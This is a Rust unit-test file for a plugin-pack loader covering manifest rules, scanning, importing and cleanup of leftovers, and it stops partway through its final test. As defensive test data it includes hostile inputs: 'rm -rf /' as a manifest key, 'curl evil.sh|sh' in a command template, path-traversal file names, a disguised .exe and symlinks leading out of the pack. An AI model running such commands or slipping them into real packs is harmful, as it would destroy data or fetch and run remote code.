//! Unit tests for the plugin packs: the manifest rules, scanning, importing and removing, with hostile packs for every rule a third party could try to get around.

use super::command_table::CommandRow;
use super::sound_pack::{SequenceAdvance, SoundMode};
use super::*;
use std::io::Write;
use tempfile::tempdir;

const HEADER: &[u8] = b"RIFF\x24\0\0\0WAVEfmt ";

fn wav() -> Vec<u8> {
    let mut bytes = HEADER.to_vec();
    bytes.extend_from_slice(&[0; 32]);
    bytes
}

const SOUND: &str = "schema_version = 1\nkind = 'sound'\nid = 'typewriter'\nname = '打字机'\nversion = '1.0.0'\nlicense = 'CC-BY-4.0'\nauthor = 'Synthetic'\npermissions = []\nmode = 'keys'\n[sounds]\ndefault = 'key.wav'\nspace = 'space.wav'\ncommit = 'key.wav'\n";

/// A valid keys-mode sound pack in `<directory>/<id>`, with its manifest as given.
fn sound_pack(directory: &Path, manifest: &str) -> PathBuf {
    let id = manifest
        .lines()
        .find_map(|line| line.strip_prefix("id = '"))
        .and_then(|rest| rest.strip_suffix('\''))
        .unwrap_or("typewriter");
    let pack = directory.join(id);
    fs::create_dir_all(&pack).unwrap();
    fs::write(pack.join(MANIFEST_FILE), manifest).unwrap();
    fs::write(pack.join("key.wav"), wav()).unwrap();
    fs::write(pack.join("space.wav"), wav()).unwrap();
    pack
}

fn installed_sound(root: &Path, manifest: &str) -> PathBuf {
    sound_pack(&kind_directory(root, PluginKind::Sound), manifest)
}

fn command_manifest(id: &str, rows: &str) -> String {
    format!("schema_version = 1\nkind = 'command_table'\nid = '{id}'\nname = '签名'\nversion = '1'\nlicense = 'CC0-1.0'\n{rows}")
}

fn installed_commands(root: &Path, id: &str, rows: &str) -> PathBuf {
    let pack = kind_directory(root, PluginKind::CommandTable).join(id);
    fs::create_dir_all(&pack).unwrap();
    fs::write(pack.join(MANIFEST_FILE), command_manifest(id, rows)).unwrap();
    pack
}

fn reason(root: &Path, kind: PluginKind, id: &str) -> String {
    load_package(root, None, kind, id).unwrap_err()
}

fn builtin_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../resources/sound-packs")
}

#[test]
fn the_built_in_packs_the_bundles_ship_are_valid() {
    let root = tempdir().unwrap();
    let catalog = scan(root.path(), Some(&builtin_root()));
    assert!(catalog.issues.is_empty(), "{:?}", catalog.issues);
    let ids: Vec<_> = catalog.packages.iter().map(|p| p.id.as_str()).collect();
    assert_eq!(
        ids.len(),
        BUILTIN_SOUND_PACKS.len() + BUILTIN_MUSIC_PACKS.len()
    );
    for (kind, builtins) in [
        (PluginKind::Sound, &BUILTIN_SOUND_PACKS[..]),
        (PluginKind::Music, &BUILTIN_MUSIC_PACKS[..]),
    ] {
        for id in builtins {
            assert!(ids.contains(id), "{id}");
            assert!(is_builtin(kind, id), "{id}");
            let pack = load_package(root.path(), Some(&builtin_root()), kind, id).unwrap();
            assert!(pack.builtin);
            assert_eq!(pack.kind(), kind, "{id}");
            assert_eq!(pack.license, "CC0-1.0");
            // A built-in id of one kind is not built in as the other.
            let other = match kind {
                PluginKind::Sound => PluginKind::Music,
                _ => PluginKind::Sound,
            };
            assert!(!is_builtin(other, id), "{id}");
            assert!(load_package(root.path(), Some(&builtin_root()), other, id).is_err());
        }
    }
    assert!(!is_builtin(PluginKind::CommandTable, DEFAULT_SOUND_PACK));
    let PluginContent::Sound(default) = load_package(
        root.path(),
        Some(&builtin_root()),
        PluginKind::Sound,
        DEFAULT_SOUND_PACK,
    )
    .unwrap()
    .content
    else {
        panic!("default is a sound pack");
    };
    assert_eq!(default.mode, SoundMode::Keys);
    for class in ["default", "space", "enter", "backspace"] {
        assert!(default.key_sample(class).is_some(), "{class}");
    }
    assert!(default.sounds.commit.is_some() && default.sounds.achievement.is_some());
    let PluginContent::Sound(melody) = load_package(
        root.path(),
        Some(&builtin_root()),
        PluginKind::Sound,
        DEFAULT_MELODY_PACK,
    )
    .unwrap()
    .content
    else {
        panic!("the melody is a sound pack");
    };
    assert_eq!(melody.mode, SoundMode::Sequence);
    assert_eq!(melody.key_sample("default"), None);
    let sequence = melody.sequence.unwrap();
    assert_eq!(sequence.semitones.len(), 42);
    assert_eq!(sequence.advance, SequenceAdvance::Key);
}

#[test]
fn scan_lists_each_kind_and_reports_what_is_not_a_pack() {
    let root = tempdir().unwrap();
    installed_sound(root.path(), SOUND);
    installed_commands(
        root.path(),
        "sig",
        "[[commands]]\ntrigger = 'sig'\ntitle = '签名'\ntemplate = '张三 {date}'\n",
    );
    let music = kind_directory(root.path(), PluginKind::Music).join("rain");
    fs::create_dir_all(&music).unwrap();
    fs::write(music.join("rain.ogg"), b"OggS\0\x02synthetic-track").unwrap();
    fs::write(music.join("LICENSE.txt"), b"CC0").unwrap();
    fs::write(
        music.join(MANIFEST_FILE),
        "schema_version = 1\nkind = 'music'\nid = 'rain'\nname = 'Rain'\nversion = '1'\nlicense = 'CC0-1.0'\n[music]\ntracks = ['rain.ogg']\n",
    )
    .unwrap();
    // Not packs: a stray file, a leftover of an interrupted import, a folder without a manifest.
    fs::write(
        kind_directory(root.path(), PluginKind::Sound).join("notes.txt"),
        b"x",
    )
    .unwrap();
    fs::create_dir_all(kind_directory(root.path(), PluginKind::Sound).join(".replaced-old"))
        .unwrap();
    fs::create_dir_all(kind_directory(root.path(), PluginKind::Music).join("empty")).unwrap();

    let catalog = scan(root.path(), None);
    let listed: Vec<_> = catalog
        .packages
        .iter()
        .map(|package| (package.kind(), package.id.as_str(), package.builtin))
        .collect();
    assert_eq!(
        listed,
        [
            (PluginKind::Sound, "typewriter", false),
            (PluginKind::Music, "rain", false),
            (PluginKind::CommandTable, "sig", false),
        ]
    );
    let issues: Vec<_> = catalog
        .issues
        .iter()
        .map(|issue| (issue.kind, issue.folder.as_str()))
        .collect();
    assert_eq!(
        issues,
        [
            (PluginKind::Sound, "notes.txt"),
            (PluginKind::Music, "empty")
        ]
    );
    let json = serde_json::to_value(&catalog.packages[0]).unwrap();
    assert_eq!(json["kind"], "sound");
    assert_eq!(json["mode"], "keys");
    assert_eq!(json["sounds"]["default"], "key.wav");
    assert_eq!(json["builtin"], false);
    assert!(json.get("directory").is_none());
}

#[test]
fn unknown_kinds_on_disk_never_fail_the_catalog() {
    // 新版本装进来的类型目录（这里是 `theme`）不被扫描；已知目录里声明了未知 kind 的包记为一条 issue。旧版本因此不会因为新类型整页失败。
    let root = tempdir().unwrap();
    installed_sound(root.path(), SOUND);
    let future = root.path().join("theme").join("neon");
    fs::create_dir_all(&future).unwrap();
    fs::write(
        future.join(MANIFEST_FILE),
        "schema_version = 1\nkind = 'theme'\nid = 'neon'\nname = 'Neon'\nversion = '1'\nlicense = 'CC0-1.0'\n",
    )
    .unwrap();
    let stray = kind_directory(root.path(), PluginKind::Sound).join("x");
    fs::create_dir_all(&stray).unwrap();
    fs::write(
        stray.join(MANIFEST_FILE),
        "schema_version = 1\nkind = 'theme'\nid = 'x'\nname = 'X'\nversion = '1'\nlicense = 'CC0-1.0'\n",
    )
    .unwrap();

    let catalog = scan(root.path(), None);
    let listed: Vec<_> = catalog.packages.iter().map(|p| p.id.as_str()).collect();
    assert_eq!(listed, ["typewriter"]);
    assert_eq!(catalog.issues.len(), 1, "{:?}", catalog.issues);
    assert_eq!(catalog.issues[0].kind, PluginKind::Sound);
    assert_eq!(catalog.issues[0].folder, "x");
    assert_eq!(catalog.issues[0].reason, "kind 不是已知的插件类型");
}

#[test]
fn a_nonexistent_root_is_an_empty_catalog() {
    let root = tempdir().unwrap();
    assert_eq!(
        scan(&root.path().join("plugins"), None),
        PluginCatalog::default()
    );
}

#[test]
fn manifests_are_refused_for_every_rule_they_break() {
    let root = tempdir().unwrap();
    let cases: &[(&str, &str, &str)] = &[
        ("kind = 'sound'", "kind = 'script'", "不是已知的插件类型"),
        ("kind = 'sound'", "kind = 'wasm'", "不是已知的插件类型"),
        (
            "permissions = []",
            "permissions = ['network']",
            "不能申请权限",
        ),
        (
            "permissions = []",
            "permissions = 'none'",
            "permissions 必须是数组",
        ),
        ("license = 'CC-BY-4.0'\n", "", "license 必须是字符串"),
        ("license = 'CC-BY-4.0'", "license = '<script>'", "SPDX"),
        (
            "license = 'CC-BY-4.0'",
            "license = '   '",
            "license 的长度或字符",
        ),
        (
            "schema_version = 1",
            "schema_version = 2",
            "不支持这个 schema_version",
        ),
        (
            "author = 'Synthetic'",
            "authors = 'Synthetic'",
            "未知的键 authors",
        ),
        (
            "mode = 'keys'",
            "mode = 'keys'\nexec = 'rm -rf /'",
            "未知的键 exec",
        ),
        (
            "space = 'space.wav'",
            "tab = 'space.wav'",
            "sounds 里有未知的键 tab",
        ),
        ("default = 'key.wav'\n", "", "keys 模式需要 sounds.default"),
        (
            "mode = 'keys'",
            "mode = 'loop'",
            "mode 只能是 keys 或 sequence",
        ),
        (
            "mode = 'keys'",
            "mode = 'sequence'",
            "sequence 模式需要 sequence",
        ),
        (
            "space = 'space.wav'",
            "space = '../space.wav'",
            "不是 .wav 文件名",
        ),
        (
            "space = 'space.wav'",
            "space = '/etc/space.wav'",
            "不是 .wav 文件名",
        ),
        (
            "space = 'space.wav'",
            "space = 'sub/space.wav'",
            "不是 .wav 文件名",
        ),
        (
            "space = 'space.wav'",
            "space = 'space.mp3'",
            "不是 .wav 文件名",
        ),
        // Samples are WAV only: an Ogg sample is refused by name, whatever its contents, while a music pack still takes Ogg tracks.
        (
            "space = 'space.wav'",
            "space = 'space.ogg'",
            "音效包只接受 WAV 音频",
        ),
        (
            "space = 'space.wav'",
            "space = 'missing.wav'",
            "缺少音频文件",
        ),
        ("name = '打字机'", "name = ''", "name 的长度或字符"),
        (
            "name = '打字机'",
            "name = \"a\\u0007b\"",
            "name 的长度或字符",
        ),
    ];
    for (from, to, expected) in cases {
        let manifest = SOUND.replacen(from, to, 1);
        assert_ne!(manifest, SOUND, "{from}");
        let pack = installed_sound(root.path(), &manifest);
        let error = reason(root.path(), PluginKind::Sound, "typewriter");
        assert!(error.contains(expected), "{to}: {error}");
        fs::remove_dir_all(pack).unwrap();
    }
    // A pack in the wrong kind directory, or under another folder name.
    let pack = sound_pack(&kind_directory(root.path(), PluginKind::Music), SOUND);
    assert!(reason(root.path(), PluginKind::Music, "typewriter").contains("kind 与所在目录不一致"));
    fs::remove_dir_all(pack).unwrap();
    let pack = installed_sound(root.path(), SOUND);
    fs::rename(&pack, pack.with_file_name("renamed")).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "renamed").contains("id 与文件夹名不一致"));
}

#[test]
fn sequences_are_bounded() {
    let root = tempdir().unwrap();
    let base = "schema_version = 1\nkind = 'sound'\nid = 'tune'\nname = 'Tune'\nversion = '1'\nlicense = 'CC0-1.0'\nmode = 'sequence'\n[sequence]\nsample = 'key.wav'\n";
    let too_many = format!("semitones = [{}]\n", vec!["0"; 129].join(","));
    for (sequence, expected) in [
        ("semitones = [0, 25]\n", "-24 到 24"),
        ("semitones = [0, 1.5]\n", "-24 到 24"),
        ("semitones = []\n", "不在允许范围内"),
        (too_many.as_str(), "不在允许范围内"),
        ("semitones = [0]\nadvance = 'time'\n", "advance 只能是"),
        ("semitones = [0]\nrate = 2\n", "sequence 里有未知的键 rate"),
    ] {
        let pack = installed_sound(root.path(), &format!("{base}{sequence}"));
        let error = reason(root.path(), PluginKind::Sound, "tune");
        assert!(error.contains(expected), "{sequence}: {error}");
        fs::remove_dir_all(pack).unwrap();
    }
    installed_sound(
        root.path(),
        &format!("{base}semitones = [-24, 0, 24]\nadvance = 'commit'\n"),
    );
    // `space.wav` is in the directory but not in this manifest.
    assert!(reason(root.path(), PluginKind::Sound, "tune")
        .contains("space.wav 没有在 plugin.toml 里用到"));
    fs::remove_file(kind_directory(root.path(), PluginKind::Sound).join("tune/space.wav")).unwrap();
    let pack = load_package(root.path(), None, PluginKind::Sound, "tune").unwrap();
    let PluginContent::Sound(sound) = pack.content else {
        panic!("a sound pack");
    };
    assert_eq!(sound.sequence.unwrap().semitones, [-24, 0, 24]);
    // A keys pack may not carry a melody.
    let keys = format!(
        "{}\n[sequence]\nsample = 'key.wav'\nsemitones = [0]\n",
        SOUND
    );
    installed_sound(root.path(), &keys);
    assert!(reason(root.path(), PluginKind::Sound, "typewriter")
        .contains("只有 sequence 模式才能有 sequence"));
}

#[test]
fn pack_directories_hold_only_plain_files_the_manifest_accounts_for() {
    let root = tempdir().unwrap();
    let pack = installed_sound(root.path(), SOUND);
    // Notices are allowed, within their size.
    fs::write(pack.join("LICENSE.txt"), b"synthetic").unwrap();
    fs::write(pack.join("README.md"), b"synthetic").unwrap();
    assert!(load_package(root.path(), None, PluginKind::Sound, "typewriter").is_ok());
    fs::write(
        pack.join("README.md"),
        vec![b'x'; MAX_NOTICE_BYTES as usize + 1],
    )
    .unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("README.md 太大"));
    fs::remove_file(pack.join("README.md")).unwrap();

    for (name, contents, expected) in [
        (
            "run.sh",
            &b"#!/bin/sh"[..],
            "run.sh 没有在 plugin.toml 里用到",
        ),
        (
            "extra.wav",
            &wav()[..],
            "extra.wav 没有在 plugin.toml 里用到",
        ),
        (
            "lib.dylib",
            &b"\xcf\xfa\xed\xfe"[..],
            "lib.dylib 没有在 plugin.toml 里用到",
        ),
        (
            "Key.WAV.exe",
            &b"MZ"[..],
            "Key.WAV.exe 没有在 plugin.toml 里用到",
        ),
        ("key wav.txt", &b"x"[..], "key wav.txt 不是有效的文件名"),
    ] {
        fs::write(pack.join(name), contents).unwrap();
        let error = reason(root.path(), PluginKind::Sound, "typewriter");
        assert!(error.contains(expected), "{name}: {error}");
        fs::remove_file(pack.join(name)).unwrap();
    }

    // What Finder leaves behind is ignored, and never read.
    fs::write(pack.join(".DS_Store"), b"finder").unwrap();
    fs::create_dir(pack.join(".git")).unwrap();
    assert!(load_package(root.path(), None, PluginKind::Sound, "typewriter").is_ok());

    fs::create_dir(pack.join("nested")).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("nested 是子文件夹"));
    fs::remove_dir(pack.join("nested")).unwrap();

    for index in 0..MAX_PACK_FILES {
        fs::write(pack.join(format!("NOTICE-{index}.txt")), b"x").unwrap();
    }
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("文件太多"));
}

#[test]
fn audio_is_checked_for_size_and_format_without_being_decoded() {
    let root = tempdir().unwrap();
    let pack = installed_sound(root.path(), SOUND);
    fs::write(pack.join("space.wav"), b"#!/bin/sh\nnot audio at all").unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("不是 WAV 或 Ogg"));
    fs::write(pack.join("space.wav"), b"OggS but named wav").unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("不是 WAV 或 Ogg"));
    fs::write(pack.join("space.wav"), b"").unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("为空或太大"));
    let mut oversized = wav();
    oversized.resize(sound_pack::MAX_SAMPLE_BYTES as usize + 1, 0);
    fs::write(pack.join("space.wav"), oversized).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("为空或太大"));

    assert!(sound_pack::sample_frames_allowed(44_100, 66_150));
    assert!(!sound_pack::sample_frames_allowed(44_100, 66_151));
    assert!(!sound_pack::sample_frames_allowed(44_100, 0));
    assert!(!sound_pack::sample_frames_allowed(4_000, 10));
    assert!(!sound_pack::sample_frames_allowed(48_000, u64::MAX));
    assert!(music_pack::track_frames_allowed(48_000, 48_000 * 900));
    assert!(!music_pack::track_frames_allowed(48_000, 48_000 * 900 + 1));
}

#[test]
fn music_packs_are_bounded() {
    let root = tempdir().unwrap();
    let pack = kind_directory(root.path(), PluginKind::Music).join("rain");
    fs::create_dir_all(&pack).unwrap();
    let manifest = |tracks: &str| {
        format!("schema_version = 1\nkind = 'music'\nid = 'rain'\nname = 'Rain'\nversion = '1'\nlicense = 'CC0-1.0'\n[music]\ntracks = [{tracks}]\n")
    };
    for (tracks, expected) in [
        ("", "不在允许范围内"),
        ("'a.ogg','a.ogg'", "重复了"),
        ("'a.flac'", "不是 .wav 或 .ogg"),
    ] {
        fs::write(pack.join(MANIFEST_FILE), manifest(tracks)).unwrap();
        let error = reason(root.path(), PluginKind::Music, "rain");
        assert!(error.contains(expected), "{tracks}: {error}");
    }
    let nine: Vec<_> = (0..9).map(|index| format!("'t{index}.ogg'")).collect();
    fs::write(pack.join(MANIFEST_FILE), manifest(&nine.join(","))).unwrap();
    assert!(reason(root.path(), PluginKind::Music, "rain").contains("不在允许范围内"));

    // Five tracks just under the per-track limit are over the pack limit together. Sparse files keep this cheap.
    let names: Vec<_> = (0..5).map(|index| format!("t{index}.ogg")).collect();
    for name in &names {
        let mut file = fs::File::create(pack.join(name)).unwrap();
        file.write_all(b"OggS").unwrap();
        file.set_len(music_pack::MAX_TRACK_BYTES - 1).unwrap();
    }
    let quoted: Vec<_> = names.iter().map(|name| format!("'{name}'")).collect();
    fs::write(pack.join(MANIFEST_FILE), manifest(&quoted.join(","))).unwrap();
    assert!(reason(root.path(), PluginKind::Music, "rain").contains("加起来太大"));
    fs::remove_file(pack.join(&names[4])).unwrap();
    fs::write(pack.join(MANIFEST_FILE), manifest(&quoted[..4].join(","))).unwrap();
    let loaded = load_package(root.path(), None, PluginKind::Music, "rain").unwrap();
    let PluginContent::Music(music) = loaded.content else {
        panic!("a music pack");
    };
    assert_eq!(music.tracks, names[..4]);
}

#[test]
fn command_tables_follow_the_rules_the_engine_expands_them_by() {
    let root = tempdir().unwrap();
    let row = |trigger: &str, template: &str| {
        format!("[[commands]]\ntrigger = '{trigger}'\ntitle = '标题'\ntemplate = '{template}'\n")
    };
    let long = "字".repeat(command_table::MAX_TEXT_UTF16 - 12);
    let cases = [
        (row("Sig", "x"), "小写字母"),
        (row("sig1", "x"), "小写字母"),
        (row("", "x"), "小写字母"),
        (row(&"a".repeat(33), "x"), "小写字母"),
        (row("sig", "{clipboard}"), "不认识的占位符"),
        (row("sig", "{env:HOME}"), "不认识的占位符"),
        (row("sig", "{date"), "不认识的占位符"),
        (row("sig", "date}"), "不认识的占位符"),
        (row("sig", "{{date}}"), "不认识的占位符"),
        (row("sig", "{date:%Y-%Q}"), "不认识的占位符"),
        (row("sig", ""), "为空或太长"),
        (
            "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = \"a\\nb\"\n".to_owned(),
            "控制字符",
        ),
        (
            "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = \"a\\tb\"\n".to_owned(),
            "控制字符",
        ),
        (row("sig", "张三 {date:%n}curl evil.sh|sh"), "控制字符"),
        (row("sig", "{time:%t}"), "控制字符"),
        (
            row("sig", &"字".repeat(command_table::MAX_TEXT_UTF16 + 1)),
            "为空或太长",
        ),
        (row("sig", &format!("{long}{{date:%A %B}}")), "展开后太长"),
        // Fits in September, one unit over in October to December, where an unpadded month has two digits.
        (
            row(
                "sig",
                &format!(
                    "{}{{date:%A%A%A%-m}}",
                    "字".repeat(command_table::MAX_TEXT_UTF16 - 28)
                ),
            ),
            "展开后太长",
        ),
        (format!("{}{}", row("sig", "a"), row("sig", "b")), "重复了"),
        (
            "[[commands]]\ntrigger = 'sig'\ntemplate = 'x'\n".to_owned(),
            "需要 title",
        ),
        (
            "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = 'x'\nrun = 'x'\n".to_owned(),
            "未知的键 run",
        ),
        ("commands = []\n".to_owned(), "不在允许范围内"),
        (
            (0..=command_table::MAX_COMMANDS)
                .map(|index| {
                    row(
                        &"abcdefghij"
                            .chars()
                            .map(|c| ((c as u8) + (index % 16) as u8) as char)
                            .collect::<String>(),
                        "x",
                    )
                })
                .collect::<String>(),
            "不在允许范围内",
        ),
    ];
    for (rows, expected) in cases {
        installed_commands(root.path(), "sig", &rows);
        let error = reason(root.path(), PluginKind::CommandTable, "sig");
        assert!(error.contains(expected), "{rows}: {error}");
    }
    installed_commands(
        root.path(),
        "sig",
        &format!(
            "{}{}{}",
            row("sig", "张三 {date:%Y年%m月%d日} {weekday}"),
            row("now", "{time} {time:%H:%M:%S}"),
            row("tag", &format!("{long}{{date:%d}}"))
        ),
    );
    let loaded = load_package(root.path(), None, PluginKind::CommandTable, "sig").unwrap();
    let PluginContent::CommandTable(table) = loaded.content else {
        panic!("a command table");
    };
    assert_eq!(table.commands.len(), 3);
    assert_eq!(table.commands[0].title, "标题");
}

#[test]
fn enabled_command_tables_merge_in_priority_order() {
    let root = tempdir().unwrap();
    let row = |trigger: &str, template: &str| {
        format!("[[commands]]\ntrigger = '{trigger}'\ntitle = 't'\ntemplate = '{template}'\n")
    };
    installed_commands(
        root.path(),
        "first",
        &format!("{}{}", row("sig", "one"), row("mail", "a@example.com")),
    );
    installed_commands(
        root.path(),
        "second",
        &format!("{}{}", row("sig", "two"), row("tel", "000")),
    );
    installed_commands(root.path(), "broken", &row("Bad", "x"));
    let enabled = |ids: &[&str]| -> Vec<(String, String)> {
        let ids: Vec<String> = ids.iter().map(|id| (*id).to_owned()).collect();
        command_table::enabled_commands(root.path(), &ids)
            .into_iter()
            .map(
                |CommandRow {
                     trigger, template, ..
                 }| (trigger, template),
            )
            .collect()
    };
    let pair = |trigger: &str, template: &str| (trigger.to_owned(), template.to_owned());
    assert_eq!(
        enabled(&["first", "second"]),
        [
            pair("sig", "one"),
            pair("mail", "a@example.com"),
            pair("tel", "000")
        ]
    );
    assert_eq!(
        enabled(&["second", "missing", "broken", "first"]),
        [
            pair("sig", "two"),
            pair("tel", "000"),
            pair("mail", "a@example.com")
        ]
    );
    assert!(enabled(&[]).is_empty());
    assert!(enabled(&["../first"]).is_empty());

    // The merged table stops where the Engine would.
    let many = |offset: usize| -> String {
        (0..200)
            .map(|index| {
                let index = index + offset;
                let trigger: String = [index / 676, index / 26 % 26, index % 26]
                    .iter()
                    .map(|digit| (b'a' + *digit as u8) as char)
                    .collect();
                row(&trigger, "x")
            })
            .collect()
    };
    installed_commands(root.path(), "many", &many(0));
    installed_commands(root.path(), "more", &many(1000));
    assert_eq!(
        enabled(&["many", "more"]).len(),
        command_table::MAX_COMMANDS
    );
}

#[cfg(unix)]
#[test]
fn symbolic_links_are_never_followed_into_or_out_of_a_pack() {
    let root = tempdir().unwrap();
    let outside = tempdir().unwrap();
    fs::write(outside.path().join("secret.wav"), wav()).unwrap();

    let pack = installed_sound(root.path(), SOUND);
    fs::remove_file(pack.join("space.wav")).unwrap();
    std::os::unix::fs::symlink(outside.path().join("secret.wav"), pack.join("space.wav")).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("space.wav 是符号链接"));
    fs::remove_file(pack.join("space.wav")).unwrap();
    std::os::unix::fs::symlink(outside.path(), pack.join("assets")).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("assets 是符号链接"));
    fs::remove_dir_all(&pack).unwrap();

    // A linked pack directory, and a linked manifest.
    let real = sound_pack(outside.path(), SOUND);
    std::os::unix::fs::symlink(
        &real,
        kind_directory(root.path(), PluginKind::Sound).join("typewriter"),
    )
    .unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("不是插件文件夹"));
    let catalog = scan(root.path(), None);
    assert!(catalog.packages.is_empty());
    assert_eq!(catalog.issues[0].folder, "typewriter");
    fs::remove_file(kind_directory(root.path(), PluginKind::Sound).join("typewriter")).unwrap();
    let pack = installed_sound(root.path(), SOUND);
    fs::remove_file(pack.join(MANIFEST_FILE)).unwrap();
    std::os::unix::fs::symlink(real.join(MANIFEST_FILE), pack.join(MANIFEST_FILE)).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("符号链接"));
}

#[cfg(unix)]
#[test]
fn a_linked_kind_directory_cannot_load_a_pack_outside_the_plugins_root() {
    let root = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let pack = sound_pack(outside.path(), SOUND);
    std::os::unix::fs::symlink(
        outside.path(),
        kind_directory(root.path(), PluginKind::Sound),
    )
    .unwrap();

    assert!(load_package(root.path(), None, PluginKind::Sound, "typewriter").is_err());
    assert!(pack.join(MANIFEST_FILE).is_file());
}

#[test]
fn built_in_ids_are_reserved_and_resolved_only_from_the_bundle() {
    let root = tempdir().unwrap();
    installed_sound(root.path(), &SOUND.replace("typewriter", "default"));
    assert!(reason(root.path(), PluginKind::Sound, "default").contains("内置音效包不可用"));
    let catalog = scan(root.path(), None);
    assert!(catalog.issues[0].reason.contains("属于内置插件"));
    let resolved = load_package(
        root.path(),
        Some(&builtin_root()),
        PluginKind::Sound,
        "default",
    )
    .unwrap();
    assert!(resolved.builtin);
    assert_ne!(resolved.name, "打字机");
    assert!(load_package(root.path(), None, PluginKind::Sound, "../default").is_err());
}

#[test]
fn a_manifest_past_its_size_is_not_parsed() {
    let root = tempdir().unwrap();
    let pack = installed_sound(root.path(), SOUND);
    let mut manifest = SOUND.to_owned();
    manifest.push_str(&format!("# {}\n", "x".repeat(MAX_MANIFEST_BYTES as usize)));
    fs::write(pack.join(MANIFEST_FILE), manifest).unwrap();
    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("太大"));
}

fn picked_folder(parent: &Path, manifest: &str) -> PathBuf {
    let folder = sound_pack(parent, manifest);
    fs::write(folder.join(".DS_Store"), b"finder").unwrap();
    fs::create_dir(folder.join(".git")).unwrap();
    folder
}

#[test]
fn import_installs_a_picked_folder_and_replaces_an_older_version_whole() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    let installed = import(&picked_folder(files.path(), SOUND), &root).unwrap();
    assert_eq!(installed.id, "typewriter");
    assert_eq!(installed.kind(), PluginKind::Sound);
    assert_eq!(installed.directory, root.join("sound").join("typewriter"));
    assert!(!installed.directory.join(".DS_Store").exists());
    assert_eq!(scan(&root, None).packages.len(), 1);

    // A new version without `space.wav` leaves no trace of the old one.
    let newer = tempdir().unwrap();
    let manifest = SOUND
        .replace("space = 'space.wav'\n", "")
        .replace("1.0.0", "2.0.0");
    let folder = sound_pack(newer.path(), &manifest);
    fs::remove_file(folder.join("space.wav")).unwrap();
    let installed = import(&folder, &root).unwrap();
    assert_eq!(installed.version, "2.0.0");
    assert!(!installed.directory.join("space.wav").exists());
    let mut names: Vec<_> = fs::read_dir(&root)
        .unwrap()
        .map(|entry| entry.unwrap().file_name().into_string().unwrap())
        .collect();
    names.sort();
    assert_eq!(names, [import::LOCK_FILE, "sound"]);
    let names: Vec<_> = fs::read_dir(root.join("sound"))
        .unwrap()
        .map(|entry| entry.unwrap().file_name().into_string().unwrap())
        .collect();
    assert_eq!(names, ["typewriter"]);
}

#[test]
fn a_refused_import_leaves_the_installed_pack_and_no_staging() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    import(&picked_folder(files.path(), SOUND), &root).unwrap();
    let before = fs::read(root.join("sound/typewriter").join(MANIFEST_FILE)).unwrap();

    let hostile = tempdir().unwrap();
    let folder = sound_pack(
        hostile.path(),
        &SOUND.replace("permissions = []", "permissions = ['exec']"),
    );
    assert!(
        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("不能申请权限"))
    );
    fs::remove_dir_all(&folder).unwrap();
    let folder = sound_pack(hostile.path(), SOUND);
    fs::create_dir(folder.join("payload")).unwrap();
    assert!(
        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("子文件夹"))
    );
    fs::remove_dir_all(&folder).unwrap();
    let folder = sound_pack(hostile.path(), SOUND);
    fs::write(folder.join("big.txt"), vec![b'x'; 1]).unwrap();
    fs::File::create(folder.join("huge.txt"))
        .unwrap()
        .set_len(music_pack::MAX_TRACK_BYTES + 1)
        .unwrap();
    assert!(
        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("太大"))
    );

    assert_eq!(
        fs::read(root.join("sound/typewriter").join(MANIFEST_FILE)).unwrap(),
        before
    );
    let leftovers: Vec<_> = fs::read_dir(&root)
        .unwrap()
        .map(|entry| entry.unwrap().file_name().into_string().unwrap())
        .filter(|name| name.starts_with('.'))
        .collect();
    assert!(leftovers.is_empty(), "{leftovers:?}");
}

#[test]
fn effect_styles_are_a_closed_set_with_stable_codes() {
    assert_eq!(EffectStyle::default(), EffectStyle::Off);
    for (style, name, code) in [
        (EffectStyle::Off, "off", 0),
        (EffectStyle::Flash, "flash", 1),
        (EffectStyle::Sparks, "sparks", 2),
        (EffectStyle::PowerMode, "power_mode", 3),
    ] {
        assert_eq!(serde_json::to_value(style).unwrap(), name);
        assert_eq!(
            serde_json::from_value::<EffectStyle>(name.into()).unwrap(),
            style
        );
        assert_eq!(style.code(), code);
    }
    assert!(serde_json::from_value::<EffectStyle>("confetti".into()).is_err());
    assert!(COMBO_MILESTONES.windows(2).all(|pair| pair[0] < pair[1]));
}

#[test]
fn leftovers_are_swept_only_once_they_are_old() {
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    let sound = kind_directory(&root, PluginKind::Sound);
    fs::create_dir_all(&sound).unwrap();
    let leftovers = [
        root.join(".staging-0123"),
        sound.join(".replaced-typewriter-0123"),
        sound.join(".old-typewriter-0123"),
    ];
    for leftover in &leftovers {
        fs::create_dir(leftover).unwrap();
        fs::write(leftover.join("a.wav"), b"RIFF").unwrap();
    }
    // Neither dot-named nor a directory: never touched, however old.
    fs::write(sound.join(".staging-file"), b"x").unwrap();
    installed_sound(&root, SOUND);

    // Another process may be writing into a young one right now.
    import::sweep_leftovers(&root, std::time::SystemTime::now());
    assert!(leftovers.iter().all(|leftover| leftover.is_dir()));
    let later = std::time::SystemTime::now() + import::LEFTOVER_AGE;
    import::sweep_leftovers(&root, later);
    assert!(leftovers.iter().all(|leftover| !leftover.exists()));
